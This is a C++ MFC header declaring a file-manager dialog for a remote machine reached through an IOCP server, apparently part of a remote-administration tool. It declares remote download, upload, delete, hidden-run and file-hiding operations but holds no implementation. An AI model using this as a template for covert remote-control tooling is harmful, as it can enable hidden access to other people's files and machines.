#pragma once
#include"IOCPServer.h"
#include"TrueColorToolBar.h"
// CFileDlg 对话框
typedef CList<CString, CString&> strList;

class CFileDlg : public CDialog
{
	DECLARE_DYNAMIC(CFileDlg)

public:
	strList m_Remote_Delete_Job;
	strList m_Remote_Download_Job;
	strList m_Remote_Upload_Job;
	CString m_hCopyDestFolder;
	CString m_strOperatingFile; // 文件名
	CString m_strReceiveLocalFile;
	CString Save;					//用来提示下载完成的路径

	bool m_bIsStop;
	bool m_bCanAdmin;
	CString m_strDesktopPath;
	CString m_strStartupPath;
	CString m_Local_Path;
	CString m_strUploadRemoteFile;

	BYTE m_bRemoteDriveList[1024];
	int m_nTransferMode;
	__int64 m_nOperatingFileLength; // 文件总大小
	__int64	m_nCounter;// 计数器

	CFileDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext* pContext = NULL);   // 标准构造函数
	BOOL InitView();
	void SendStop();
	void SendFileData();
	void EndLocalUploadFile();
	void SendException();
	BOOL SendUploadJob();
	void SendTransferMode();
	bool FixedUploadDirectory(LPCTSTR lpPathName);
	void ShowProgress();
	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	void OnReceiveComplete();
	void EndRemoteDeleteFile();   //删除完成
	void EndRemoteHideFile();			//属性设置完毕
	virtual ~CFileDlg();

	void EnableControl(BOOL bEnable = TRUE);

	void EndLocalRecvFile();
	void WriteLocalRecvFile();
	BOOL SendDeleteJob();
	BOOL SendDownloadJob();
	void SavaRemoteFile();


	void FixedRemoteDriveList();
	void GetRemoteFileList(CString directory = "");
	CString GetParentDirectory(CString strPath);
	void FixedRemoteFileList(BYTE* pbBuffer, DWORD dwBufferLen);
	BOOL SendHideJob();
	void ShowMessage(char* lpFmt, ...);
// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_FILEDLG };
#endif

protected:
	CTrueColorToolBar m_wndToolBar_Remote;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	HICON m_hIcon;
	CStatusBar m_wndStatusBar;
	CProgressCtrl* m_ProgressCtrl;
	CString m_Remote_Path;

	CListCtrl m_listfile;
	CEdit m_path;
	bool	 m_bIsUpload; // 是否是把本地主机传到远程上，标志方向位

	void DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList);

	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClose();
	afx_msg void OnBnClickedButton1();
	afx_msg void OnNMDblclkList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnBnClickedButton3();
	afx_msg void OnNMRClickList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	afx_msg void OnUpdateIdtRemoteDelete(CCmdUI* pCmdUI);
	afx_msg void OnUpdateIdtRemoteCopy(CCmdUI* pCmdUI);
	afx_msg void OnUpdateIdtRemotePrev(CCmdUI* pCmdUI);
	afx_msg void OnUpdateIdtRemoteNewfolder(CCmdUI* pCmdUI);
	afx_msg void OnUpdateIdtRemoteStop(CCmdUI* pCmdUI);
	afx_msg void OnIdtRemoteView();
	afx_msg void OnRviewDa();
	afx_msg void OnRviewXiao();
	afx_msg void OnRviewList();
	afx_msg void OnRviewXiang();
	afx_msg void OnIdtRemoteDown();
	afx_msg void OnIdtRemoteDelete();
	afx_msg void OnIdtRemoteNewfolder();
	afx_msg void OnIdtRemotePrev();
	afx_msg void OnIdtRemoteStop();
	afx_msg void OnRename();
	afx_msg void OnLvnEndlabeleditList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRefresh();
	afx_msg void OnShowRun();
	afx_msg void OnHideRun();
//	afx_msg void OnDropFiles(HDROP hDropInfo);
	afx_msg void OnFileDown();
//	afx_msg void OnHdnBegindragList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnDropFiles(HDROP hDropInfo);
protected:
	afx_msg LRESULT OnUpload(WPARAM wParam, LPARAM lParam);
public:
	afx_msg void OnFileHide();
	afx_msg void OnLvnColumnclickList1(NMHDR* pNMHDR, LRESULT* pResult);
};
